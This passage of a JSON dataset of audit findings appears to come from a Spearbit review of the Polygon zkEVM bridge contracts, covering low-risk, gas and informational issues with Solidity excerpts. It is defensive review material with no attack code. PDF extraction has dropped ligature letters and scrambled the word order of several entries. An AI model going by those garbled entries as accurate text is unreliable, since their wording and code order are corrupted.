        "body": "Both claimAsset() and claimMessage() might revert on different locations (even after retrying). Although the funds stay in the bridge, they are not accessible by the originator or recipient of the bridge action. So they are essentially lost for the originator and recipient. Some other bridges have recovery addresses where the funds can be delivered instead. Here are several potential revert situations: 9 function claimAsset(...) ... { ... (bool success, ) = destinationAddress.call{value: amount}(new bytes(0)); require(success, ... ); ... IERC20Upgradeable(originTokenAddress).safeTransfer(destinationAddress,amount); ... TokenWrapped newWrappedToken = (new TokenWrapped){ salt: tokenInfoHash }(name, symbol, decimals); ... } function claimMessage(...) ... { ... (bool success, ) = destinationAddress.call{value: amount}( abi.encodeCall( IBridgeMessageReceiver.onMessageReceived, (originAddress, originNetwork, metadata) ) ); require(success, \"PolygonZkEVMBridge::claimMessage: Message failed\"); ... }",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Inheritance structure does not openly support contract upgrades",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "The solidity compiler uses C3 linearisation to determine the order of contract inheritance. This is performed as left to right of all child contracts before considering the parent contract. Storage slot assignment PolygonZkEVMBridge is as follows: Initializable -> DepositContract -> EmergencyManager -> The Initializable.sol already reserves storage slots for future upgrades and because PolygonZkEVM- Bridge.sol is inherited last, storage slots can be safely appended. However, the two intermediate contracts, DepositContract.sol and EmergencyManager.sol, cannot handle storage upgrades.",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Function calculateRewardPerBatch() could divide by 0",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "The function calculateRewardPerBatch() does a division by totalBatchesToVerify. If there are currently no batches to verify, then totalBatchesToVerify would be 0 and the transaction would revert. When calculateRewardPerBatch() is called from _verifyBatches() this doesnt happen as it will revert earlier. However when the function is called externally this situation could occur. function calculateRewardPerBatch() public view returns (uint256) { ... uint256 totalBatchesToVerify = ((lastForceBatch - lastForceBatchSequenced) + lastBatchSequenced) - getLastVerifiedBatch(); return currentBalance / totalBatchesToVerify; , }",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Limit gas usage of _updateBatchFee()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "The function _updateBatchFee() loops through all unveried batches. Normally this would be 30 min/5 min ~ 6 batches. Assume the aggregator malfunctions and after one week, verifyBatches() is called, which calls _updateBatch- Fee(). Then there could be 7 * 24 * 60 min/ 5 min ~ 2352 batches. The function verifyBatches() limits this to MAX_VERIFY_BATCHES == 1000. This might result in an out-of-gas error. This would possibly require multiple verifyBatches() tries with a smaller number of batches, which would increase network outage. function _updateBatchFee(uint64 newLastVerifiedBatch) internal { ... while (currentBatch != currentLastVerifiedBatch) { ... if (block.timestamp - currentSequencedBatchData.sequencedTimestamp >veryBatchTimeTarget) { ... } ... } ... }",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Keep precision in _updateBatchFee()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "Function _updateBatchFee() uses a trick to prevent losing precision in the calculation of accDivi- sor. The value accDivisor includes an extra multiplication with batchFee, which is undone when doing batchFee = (batchFee * batchFee) / accDivisor because this also contains an extra multiplication by batchFee. However, if batchFee happens to reach a small value (also see issue Minimum and maximum value for batch- Fee) then the trick doesnt work that well. In the extreme case of batchFee ==0 then a division by 0 will take place, resulting in a revert. Luckily this doesnt happen in practice. function _updateBatchFee(uint64 newLastVerifiedBatch) internal { ... uint256 accDivisor = (batchFee * (uint256(multiplierBatchFee) ** diffBatches)) / (10 ** (diffBatches * 3)); batchFee = (batchFee * batchFee) / accDivisor; ... , }",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Minimum and maximum value for batchFee",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "Function _updateBatchFee() updates the batchFee depending on the batch time target. If the batch times are repeatedly below or above the target, the batchFee could shrink or grow unlimited. If the batchFee would get too low, problems with the economic incentives might arise. If the batchFee would get too high, overows might occur. Also, the fee might too be high to be practically payable. Although not very likely to occur in practice, it is probably worth the trouble to implement limits. function _updateBatchFee(uint64 newLastVerifiedBatch) internal { ... if (totalBatchesBelowTarget < totalBatchesAboveTarget) { ... batchFee = (batchFee * (uint256(multiplierBatchFee) ** diffBatches)) / (10 ** (diffBatches * , 3)); } else { ... uint256 accDivisor = (batchFee * (uint256(multiplierBatchFee) ** diffBatches)) / (10 ** (diffBatches * 3)); , batchFee = (batchFee * batchFee) / accDivisor; } }",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Bridge deployment will fail if initialize() is front-run",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "grades.deployProxy() with no type specied. This function accepts data which is used to initialize the state of the contract being deployed. However, because the zkEVM bridge script utilizes the output of each contract address on deployment, it is not trivial to atomically deploy and initialize contracts. As a result, there is a small time window available for attackers to front-run calls to initialize the necessary bridge contracts, allowing them to temporarily DoS during the deployment process.",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Add input validation for the setVeryBatchTimeTarget method",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "The setVeryBatchTimeTarget method in PolygonZkEVM accepts a uint64 newVeryBatchTimeTar- get argument to set the veryBatchTimeTarget. This variable has a value of 30 minutes in the initialize method, so it is expected that it shouldnt hold a very big value as it is compared to timestamps difference in _updateBatchFee. Since there is no upper bound for the value of the newVeryBatchTimeTarget argument, it is possible (for example due to fat-ngering the call) that an admin passes a big value (up to type(uint64).max) which will result in wrong calculation in _updateBatchFee.",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Single-step process for critical ownership transfer",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "If the nominated newAdmin or newOwner account is not a valid account, the owner or admin risks locking themselves out. function setAdmin(address newAdmin) public onlyAdmin { admin = newAdmin; emit SetAdmin(newAdmin); } function transferOwnership(address newOwner) public virtual onlyOwner { require(newOwner != address(0), \"Ownable: new owner is the zero address\"); _transferOwnership(newOwner); }",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Ensure no native asset value is sent in payable method that can handle ERC20 transfers as well",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "The bridgeAsset method of PolygonZkEVMBridge is marked payable as it can work both with the native asset as well as with ERC20 tokens. In the codepath where it is checked that the token is not the native asset but an ERC20 token, it is not validated that the user did not actually provide value to the transaction. The likelihood of this happening is pretty low since it requires a user error but if it does happen then the native asset value will be stuck in the PolygonZkEVMBridge contract.",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Calls to the name, symbol and decimals functions will be unsafe for non-standard ERC20 tokens",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "The bridgeAsset method of PolygonZkEVMBridge accepts an address token argument and later calls the name, symbol and decimals methods of it. There are two potential problems with this: 1. Those methods are not mandatory in the ERC20 standard, so there can be ERC20-compliant tokens that do not have either or all of the name, symbol or decimals methods, so they will not be usable with the protocol, because the calls will revert 2. There are tokens that use bytes32 instead of string as the value type of their name and symbol storage vari- ables and their getter functions (example is MKR). This can cause reverts when trying to consume metadata from those tokens. Also, see weird-erc20 for nonstandard tokens.",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Use calldata instead of memory for array parameters",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "The code frequently uses memory arrays for externally called functions. Some gas could be saved by making these calldata. The calldata can also be cascaded to internal functions that are called from the external functions. function claimAsset(bytes32[] memory smtProof) public { ... _verifyLeaf(smtProof); ... } function _verifyLeaf(bytes32[] memory smtProof) internal { ... verifyMerkleProof(smtProof); ... } function verifyMerkleProof(..., bytes32[] memory smtProof, ...) internal { ... }",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Optimize networkID == MAINNET_NETWORK_ID",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "The value for networkID is dened in initialize() and MAINNET_NETWORK_ID is constant. So networkID == MAINNET_NETWORK_ID can be calculated in initialize() and stored to save some gas. It is even cheaper if networkID is immutable, which would require adding a constructor. uint32 public constant MAINNET_NETWORK_ID = 0; uint32 public networkID; function initialize(uint32 _networkID, ...) public virtual initializer { networkID = _networkID; ... } function _verifyLeaf(...) ... { ... if (networkID == MAINNET_NETWORK_ID) { ... } else { ... } }",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Optimize updateExitRoot()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "The function updateExitRoot() accesses the global variables lastMainnetExitRoot and las- tRollupExitRoot multiple times. This can be optimized using temporary variables. function updateExitRoot(bytes32 newRoot) external { ... if (msg.sender == rollupAddress) { lastRollupExitRoot = newRoot; } if (msg.sender == bridgeAddress) { lastMainnetExitRoot = newRoot; } bytes32 newGlobalExitRoot = keccak256( abi.encodePacked(lastMainnetExitRoot, lastRollupExitRoot) ); if ( ... ) { ... emit UpdateGlobalExitRoot(lastMainnetExitRoot, lastRollupExitRoot); } }",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Optimize _setClaimed()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "The function claimAsset() and claimMessage() rst verify !isClaimed() (via the function _veri- fyLeaf()) and then do _setClaimed(). These two functions can be combined in a more efcient version. 17 function claimAsset(...) ... { _verifyLeaf(...); _setClaimed(index); ... } function claimMessage(...) ... { _verifyLeaf(...); _setClaimed(index); ... } function _verifyLeaf(...) ... { require( !isClaimed(index), ...); ... } function isClaimed(uint256 index) public view returns (bool) { uint256 claimedWordIndex = index / 256; uint256 claimedBitIndex = index % 256; uint256 claimedWord = claimedBitMap[claimedWordIndex]; uint256 mask = (1 << claimedBitIndex); return (claimedWord & mask) == mask; } function _setClaimed(uint256 index) private { uint256 claimedWordIndex = index / 256; uint256 claimedBitIndex = index % 256; claimedBitMap[claimedWordIndex] = claimedBitMap[claimedWordIndex] | (1 << claimedBitIndex); }",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "SMT branch comparisons can be optimised",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "When verifying a merkle proof, the search does not terminate until we have iterated through the tree depth to calculate the merkle root. The path is represented by the lower 32 bits of the index variable where each bit represents the direction of the path taken. Two changes can be made to the following snippet of code:  Bit shift currentIndex to the right instead of dividing by 2.  Avoid overwriting the currentIndex variable and perform the bitwise comparison in-line. function verifyMerkleProof( ... uint256 currrentIndex = index; for ( uint256 height = 0; height < _DEPOSIT_CONTRACT_TREE_DEPTH; height++ ) { } if ((currrentIndex & 1) == 1) node = keccak256(abi.encodePacked(smtProof[height], node)); else node = keccak256(abi.encodePacked(node, smtProof[height])); currrentIndex /= 2;",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Increments can be optimised by pre-xing variable with ++",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "There are small gas savings in performing when pre-xing increments with ++. Sometimes this can be used to combine multiple statements, like in function _deposit(). function _deposit(bytes32 leafHash) internal { ... depositCount += 1; uint256 size = depositCount; ... } Other occurrences of ++: PolygonZkEVM.sol: PolygonZkEVM.sol: PolygonZkEVM.sol: PolygonZkEVM.sol: PolygonZkEVM.sol: PolygonZkEVM.sol: PolygonZkEVM.sol: PolygonZkEVM.sol: lib/DepositContract.sol: lib/DepositContract.sol: { , lib/DepositContract.sol: { , lib/TokenWrapped.sol: verifiers/Verifier.sol: verifiers/Verifier.sol: verifiers/Verifier.sol: for (uint256 i = 0; i < batchesNum; i++) { currentLastForceBatchSequenced++; currentBatchSequenced++; lastPendingState++; lastForceBatch++; for (uint256 i = 0; i < batchesNum; i++) { currentLastForceBatchSequenced++; currentBatchSequenced++; height++ for (uint256 height = 0;height < _DEPOSIT_CONTRACT_TREE_DEPTH;height++) for (uint256 height = 0;height < _DEPOSIT_CONTRACT_TREE_DEPTH;height++) nonces[owner]++, for (uint i = 0; i < elements; i++) { for (uint i = 0; i < input.length; i++) { for (uint i = 0; i < input.length; i++) {",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Move initialization values from initialize() to immutable via constructor",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "The contracts PolygonZkEVM and PolygonZkEVMBridge initialize variables via initialize(). If these variables are never updated they could also be made immutable, which would save some gas. In order to achieve that, a constructor has to be added to set the immutable variables. This could be applicable for chainID in contract PolygonZkEVM and networkID in contract PolygonZkEVMBridge contract PolygonZkEVM is ... { ... uint64 public chainID; ... function initialize(...) ... { ... chainID = initializePackedParameters.chainID; ... } contract PolygonZkEVMBridge is ... { ... uint32 public networkID; ... function initialize(uint32 _networkID,...) ... { networkID = _networkID; ... }",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Optimize isForceBatchAllowed()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "The modier isForceBatchAllowed() includes a redundant check == true. This can be optimized to save some gas. modifier isForceBatchAllowed() { require(forceBatchAllowed == true, ... ); _; }",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Optimize loop in _updateBatchFee()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "The function _updateBatchFee() uses the following check in a loop: - currentSequencedBatchData.sequencedTimestamp > veryBatchTimeTarget. block.timestamp - veryBatchTimeTarget > currentSequencedBatchData.sequencedTimestamp block.timestamp The is the same as: As block.timestamp - veryBatchTimeTarget is constant during the execution of this function, it can be taken outside the loop to save some gas. function _updateBatchFee(uint64 newLastVerifiedBatch) internal { ... while (currentBatch != currentLastVerifiedBatch) { ... if ( block.timestamp - currentSequencedBatchData.sequencedTimestamp > veryBatchTimeTarget ) { ... } } }",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Optimize multiplication",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "The multiplication in function _updateBatchFee can be optimized to save some gas.",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Changing constant storage variables from public to private will save gas",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "Usually constant variables are not expected to be read on-chain and their value can easily be seen by looking at the source code. For this reason, there is no point in using public for a constant variable since it auto-generates a getter function which increases deployment cost and sometimes function call cost.",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Storage variables not changeable after deployment can be immutable",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "If a storage variable is not changeable after deployment (set in the constructor) it can be turned into an immutable variable to save gas.",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Optimize check in _consolidatePendingState()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "The check in function _consolidatePendingState() can be optimized to save some gas. As last- PendingStateConsolidated is of type uint64 and thus is at least 0, the check pendingStateNum > lastPend- ingStateConsolidated makes sure pendingStateNum > 0. So the explicit check for pendingStateNum != 0 isnt necessary. uint64 public lastPendingStateConsolidated; function _consolidatePendingState(uint64 pendingStateNum) internal { require( pendingStateNum != 0 && pendingStateNum > lastPendingStateConsolidated && pendingStateNum <= lastPendingState, \"PolygonZkEVM::_consolidatePendingState: pendingStateNum invalid\" ); ... }",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Custom errors not used",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "Custom errors lead to cheaper deployment and run-time costs.",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Variable can be updated only once instead of on each iteration of a loop",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "In functions sequenceBatches() and sequenceForceBatches(), the currentBatchSequenced vari- able is increased by 1 on each iteration of the loop but is not used inside of it. This means that instead of doing batchesNum addition operations, you can do it only once, after the loop.",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Optimize emits in sequenceBatches() and sequenceForceBatches()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "The emits in functions sequenceBatches() and sequenceForceBatches() could be gas optimized by using the tmp variables which have been just been stored in the emited global variables. function sequenceBatches(...) ... { ... lastBatchSequenced = currentBatchSequenced; ... emit SequenceBatches(lastBatchSequenced); } function sequenceForceBatches(...) ... { ... lastBatchSequenced = currentBatchSequenced; ... emit SequenceForceBatches(lastBatchSequenced); }",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Only update lastForceBatchSequenced if nessary in function sequenceBatches()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "The function sequenceBatches() writes back to lastForceBatchSequenced, however this is only necessary if there are forced batches. This could be optimized to save some gas and at the same time the calculation of nonForcedBatchesSequenced could also be optimized. function sequenceBatches(...) ... { ... uint64 currentLastForceBatchSequenced = lastForceBatchSequenced; ... if (currentBatch.minForcedTimestamp > 0) { currentLastForceBatchSequenced++; ... uint256 nonForcedBatchesSequenced = batchesNum - (currentLastForceBatchSequenced - lastForceBatchSequenced); ... lastForceBatchSequenced = currentLastForceBatchSequenced; ... , }",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Delete forcedBatches[currentLastForceBatchSequenced] after use",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "The functions sequenceBatches() and sequenceForceBatches() use up the forcedBatches[] and then afterward they are no longer used. Deleting these values might give a gas refund and lower the L1 gas costs. function sequenceBatches(...) ... { ... currentLastForceBatchSequenced++; ... require(hashedForcedBatchData == ... forcedBatches[currentLastForceBatchSequenced],...); } function sequenceForceBatches(...) ... { ... currentLastForceBatchSequenced++; ... require(hashedForcedBatchData == forcedBatches[currentLastForceBatchSequenced],...); ... }",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Calculate keccak256(currentBatch.transactions) once",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "cak256(currentBatch.transactions) twice. calculating the keccak256() of it could be relatively expensive. sequenceBatches() functions Both kec- sequenceForceBatches() As the currentBatch.transactions could be rather large, calculate and function sequenceBatches(BatchData[] memory batches) ... { ... if (currentBatch.minForcedTimestamp > 0) { ... bytes32 hashedForcedBatchData = ... keccak256(currentBatch.transactions) ... ... } ... currentAccInputHash = ... keccak256(currentBatch.transactions) ... ... } function sequenceForceBatches(ForcedBatchData[] memory batches) ... { ... bytes32 hashedForcedBatchData = ... keccak256(currentBatch.transactions) ... ... currentAccInputHash = ... keccak256(currentBatch.transactions) ... ... }",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Function denition of onMessageReceived()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "As discovered by the project: the function denition of onMessageReceived() is view and returns a boolean. Also, it is not payable. The function is meant to receive ETH so it should be payable. Also, it is meant to take action so is shouldnt be view. The bool return value isnt used in PolygonZkEVMBridge so isnt necessary. Because the function is called via a low-level call this doesnt pose a problem in practice. The current denition is confusing though. interface IBridgeMessageReceiver { function onMessageReceived(...) external view returns (bool); } contract PolygonZkEVMBridge is ... { function claimMessage( ... ) ... { ... (bool success, ) = destinationAddress.call{value: amount}( abi.encodeCall( IBridgeMessageReceiver.onMessageReceived, (originAddress, originNetwork, metadata) ) ); require(success, \"PolygonZkEVMBridge::claimMessage: Message failed\"); ... } }",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Informational"
        ]
    },
    {
        "title": "batchesNum can be explicitly casted in sequenceForceBatches()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "The sequenceForceBatches() function performs a check to ensure that the sequencer does not sequence forced batches that do not exist. The require statement compares two different types; uint256 and uint64. For consistency, the uint256 can be safely cast down to uint64 as solidity 0.8.0 checks for over- ow/underow.",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Informational"
        ]
    },
    {
        "title": "Metadata are not migrated on changes in l1 contract",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "wrapped tokens metadata will not change and would point to the older decimal If metadata changes on mainnet (say decimal change) after wrapped token creation then also 1. Token T1 was on mainnet with decimals 18. 2. This was bridged to rollup R1. 3. A wrapped token is created with decimal 18. 4. On mainnet T1 decimal is changed to 6. 5. Wrapped token on R1 still uses 18 decimals.",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Informational"
        ]
    },
    {
        "title": "Remove unused import in PolygonZkEVMGlobalExitRootL2",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "The contract PolygonZkEVMGlobalExitRootL2 imports SafeERC20.sol, however, this isnt used in the contract. import \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\"; contract PolygonZkEVMGlobalExitRootL2 { }",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Informational"
        ]
    },
    {
        "title": "Switch from public to external for all non-internally called methods",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "Functions that are not called from inside of the contract should be external instead of public, which prevents accidentally using a function internally that is meant to be used externally. See also issue \"Use calldata instead of memory for function parameters\".",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Informational DepositContract.sol#L90, DepositContract.sol#L124, PolygonZkEVMGlobalExitRootL2.sol#L40, PolygonZkEVM-"
        ]
    },
    {
        "title": "Common interface for PolygonZkEVMGlobalExitRoot and PolygonZkEVMGlobalExitRootL2",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "The contract PolygonZkEVMGlobalExitRoot inherits from IPolygonZkEVMGlobalExitRoot, while PolygonZkEVMGlobalExitRootL2 doesnt, although they both implement a similar interface. Note: PolygonZkEVMGlobalExitRoot implements an extra function getLastGlobalExitRoot(). the same interface le would improve the checks by the compiler. Inheriting from import \"@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol\"; contract PolygonZkEVMGlobalExitRoot is IPolygonZkEVMGlobalExitRoot, ... { ... } contract PolygonZkEVMGlobalExitRootL2 { }",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Informational"
        ]
    },
    {
        "title": "Abstract the way to calculate GlobalExitRoot",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "The algorithm to combine the mainnetExitRoot and rollupExitRoot is implemented in several locations in the code. This could be abstracted in contract PolygonZkEVMBridge, especially because this will be enhanced when more L2s are added. 30 contract PolygonZkEVMGlobalExitRoot is ... { function updateExitRoot(bytes32 newRoot) external { ... bytes32 newGlobalExitRoot = keccak256(abi.encodePacked(lastMainnetExitRoot, lastRollupExitRoot) , ); // first ... } function getLastGlobalExitRoot() public view returns (bytes32) { return keccak256(abi.encodePacked(lastMainnetExitRoot, lastRollupExitRoot) ); // second } } contract PolygonZkEVMBridge is ... { function _verifyLeaf(..., bytes32 mainnetExitRoot, bytes32 rollupExitRoot, ...) ... { ... uint256 timestampGlobalExitRoot = globalExitRootManager .globalExitRootMap( keccak256(abi.encodePacked(mainnetExitRoot, rollupExitRoot)) ); // third , ... } }",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Informational"
        ]
    },
    {
        "title": "ETH honeypot on L2",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "The initial ETH allocation to the Bridge contract on L2 is rather large: 2E8 ETH on the test network and 1E11 ETH on the production network according to the documentation. This would make the bridge a large honey pot, even more than other bridges. If someone would be able to retrieve the ETH they could exchange it with all available other coins on the L2, bridge them back to mainnet, and thus steal about all TVL on the L2.",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Informational"
        ]
    },
    {
        "title": "Allowance is not required to burn wrapped tokens",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "The burn of tokens of the deployed TokenWrapped doesnt use up any allowance, because the Bridge has the right to burn the wrapped token. Normally a user would approve a certain amount of tokens and then do an action (e.g. bridgeAsset()). This could be seen as an extra safety precaution. So you lose the extra safety this way and it might be unexpected from the users point of view. However, its also very convenient to do a one-step bridge (comparable to using the permit). Note: most other bridges do it also this way. function burn(address account, uint256 value) external onlyBridge { _burn(account, value); }",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Informational"
        ]
    },
    {
        "title": "Messages are lost when delivered to EOA by claimMessage()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "The function claimMessage() calls the function onMessageReceived() via a low-level call. When the receiving address doesnt contain a contract the low-level call still succeeds and delivers the ETH. The documen- tation says: \"... IBridgeMessageReceiver interface and such interface must be fullled by the receiver contract, it will ensure that the receiver contract has implemented the logic to handle the message.\" As we understood from the project this behavior is intentional. It can be useful to deliver ETH to Externally owned accounts (EOAs), however, the message (which is the main goal of the function) isnt interpreted and thus lost, without any notication. The loss of the delivery of the message to EOAs (e.g. non contracts) might not be obvious to the casual readers of the code/documentation. function claimMessage(...) ... { ... (bool success, ) = destinationAddress.call{value: amount}( abi.encodeCall( IBridgeMessageReceiver.onMessageReceived, (originAddress, originNetwork, metadata) ) ); require(success, \"PolygonZkEVMBridge::claimMessage: Message failed\"); ... }",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Informational"
        ]
    },
    {
        "title": "Replace assembly of _getSelector() with Solidity",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "The function _getSelector() gets the rst four bytes of a series of bytes and used assembly. This can also be implemented in Solidity, which is easier to read. function _getSelector(bytes memory _data) private pure returns (bytes4 sig) { assembly { sig := mload(add(_data, 32)) } } function _permit(..., bytes calldata permitData) ... { bytes4 sig = _getSelector(permitData); ... }",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Informational"
        ]
    },
    {
        "title": "Improvement suggestions for Verifier.sol",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "Verifier.sol is a contract automatically generated by snarkjs and is based on the template ver- ier_groth16.sol.ejs. There are some details that can be improved on this contract. However, changing it will require doing PRs for the Snarkjs project.",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Informational"
        ]
    },
    {
        "title": "Variable named incorrectly",
